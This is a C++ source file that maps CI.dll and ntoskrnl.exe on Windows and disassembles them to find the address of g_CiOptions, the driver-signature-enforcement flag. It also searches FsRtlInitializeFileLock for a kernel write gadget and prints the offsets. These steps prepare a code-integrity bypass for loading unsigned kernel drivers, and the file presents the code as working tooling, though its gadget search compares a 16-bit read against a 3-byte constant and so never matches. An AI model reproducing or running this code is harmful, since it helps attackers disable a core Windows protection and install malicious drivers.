#include "global.h"
#include "hde/hde64.h"

static
NTSTATUS
FindKernelModule(
	_In_ PCCH ModuleName,
	_Out_ PULONG_PTR ModuleBase
)
{
	*ModuleBase = 0;

	ULONG Size = 0;
	NTSTATUS Status;
	if ((Status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &Size)) != STATUS_INFO_LENGTH_MISMATCH)
		return Status;

	const PRTL_PROCESS_MODULES Modules = static_cast<PRTL_PROCESS_MODULES>(RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, 2 * static_cast<SIZE_T>(Size)));
	Status = NtQuerySystemInformation(SystemModuleInformation,
		Modules,
		2 * Size,
		nullptr);
	if (!NT_SUCCESS(Status))
		goto Exit;

	for (ULONG i = 0; i < Modules->NumberOfModules; ++i)
	{
		RTL_PROCESS_MODULE_INFORMATION Module = Modules->Modules[i];
		if (_stricmp(ModuleName, reinterpret_cast<PCHAR>(Module.FullPathName) + Module.OffsetToFileName) == 0)
		{
			*ModuleBase = reinterpret_cast<ULONG_PTR>(Module.ImageBase);
			Status = STATUS_SUCCESS;
			break;
		}
	}

Exit:
	RtlFreeHeap(RtlProcessHeap(), 0, Modules);
	return Status;
}

void FindWriteGadget(_In_ PVOID MappedBase)
{
	const PUCHAR FsRtlInitializeFileLock = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "FsRtlInitializeFileLock"));

	if (FsRtlInitializeFileLock == nullptr)
		return;

	Printf(L"FsRtlInitializeFileLock: %p\n", FsRtlInitializeFileLock);

	LONG Rel = 0;
	hde64s hs;
	ULONG c = 0;
	ULONG j = 0;
	do
	{
		if (*reinterpret_cast<PUSHORT>(FsRtlInitializeFileLock + c) == 0x118948) // MOV qword ptr [RCX],RDX - 48 89 11
		{
			Rel = *reinterpret_cast<PLONG>(FsRtlInitializeFileLock + c);
			break;
		}
		hde64_disasm(FsRtlInitializeFileLock + c, &hs);
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);

	const PUCHAR mov = FsRtlInitializeFileLock + Rel + 2;

	Printf(L"ntBase:                  %p\n", MappedBase);
	Printf(L"\n\n>>>>>>>>>>> Offset asm mov: %p\n", (mov - MappedBase));
}

// For Windows 8 and worse
static
LONG
QueryCiOptions(
	_In_ PVOID MappedBase,
	_In_ ULONG_PTR KernelBase,
	_Out_ PULONG_PTR gCiOptionsAddress
)
{
	*gCiOptionsAddress = 0;

	ULONG c;
	LONG Rel = 0;
	hde64s hs;

	const PUCHAR CiInitialize = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "CiInitialize"));
	Printf(L"CiInitialize:    %p\n", CiInitialize);

	if (CiInitialize == nullptr)
		return 0;

	if (NtCurrentPeb()->OSBuildNumber >= 16299)
	{
		c = 0;
		ULONG j = 0;
		do
		{
			// call CipInitialize
			if (CiInitialize[c] == 0xE8)
				j++;

			if (j > 2)
			{
				Rel = *reinterpret_cast<PLONG>(CiInitialize + c + 1);
				break;
			}

			hde64_disasm(CiInitialize + c, &hs);
			if (hs.flags & F_ERROR)
				break;
			c += hs.len;

		} while (c < 256);
	}
	else
	{
		c = 0;
		do
		{
			// jmp CipInitialize
			if (CiInitialize[c] == 0xE9)
			{
				Rel = *reinterpret_cast<PLONG>(CiInitialize + c + 1);
				break;
			}
			hde64_disasm(CiInitialize + c, &hs);
			if (hs.flags & F_ERROR)
				break;
			c += hs.len;

		} while (c < 256);
	}

	const PUCHAR CipInitialize = CiInitialize + c + 5 + Rel;

	Printf(L"CipInitialize:   %p\n", CipInitialize);
	c = 0;
	do
	{
		if (*reinterpret_cast<PUSHORT>(CipInitialize + c) == 0x0d89)
		{
			Rel = *reinterpret_cast<PLONG>(CipInitialize + c + 2);
			break;
		}
		hde64_disasm(CipInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);

	const PUCHAR MappedCiOptions = CipInitialize + c + 6 + Rel;

	*gCiOptionsAddress = KernelBase + MappedCiOptions - static_cast<PUCHAR>(MappedBase);

	Printf(L"CiBase:          %p\n", MappedBase);
	Printf(L"MappedCiOptions: %p\n", MappedCiOptions);
	Printf(L"\n\n>>>>>>>>>>> Offset CiOptions: %p\n", (MappedCiOptions - MappedBase));

	return Rel;
}

void GetWriteGadget()
{
	WCHAR Path[MAX_PATH];
	const CHAR NtoskrnlExe[] = "ntoskrnl.exe";
	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs", SharedUserData->NtSystemRoot, NtoskrnlExe);

	PVOID MappedBase;
	SIZE_T ViewSize;
	NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to map %ls: %08X\n", Path, Status);
		return;
	}

	ULONG_PTR KernelBase;
	Status = FindKernelModule(NtoskrnlExe, &KernelBase);
	if (!NT_SUCCESS(Status)) {
		Printf(L"Failed to FindKernelModule");
		goto Exit;
	}

	FindWriteGadget(MappedBase);

Exit:
	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
	return;
}

static
NTSTATUS
AnalyzeCi()
{

	// Map file as SEC_IMAGE
	WCHAR Path[MAX_PATH];
	const CHAR NtoskrnlExe[] = "ntoskrnl.exe";
	const CHAR CiDll[] = "CI.dll";

	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs",
		SharedUserData->NtSystemRoot,
		NtCurrentPeb()->OSBuildNumber >= 9200 ? CiDll : NtoskrnlExe);

	PVOID MappedBase;
	SIZE_T ViewSize;
	NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to map %ls: %08X\n", Path, Status);
		return Status;
	}

	// Find CI.dll!g_CiOptions
	ULONG_PTR CiDllBase;
	Status = FindKernelModule(CiDll, &CiDllBase);
	if (!NT_SUCCESS(Status))
		goto Exit;

	ULONG_PTR gCiOptionsAddress;
	QueryCiOptions(MappedBase, CiDllBase, &gCiOptionsAddress);

Exit:
	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
	return Status;
}

void CIInfo() {
	AnalyzeCi();
	Printf(L"\n\n");
	GetWriteGadget();
}
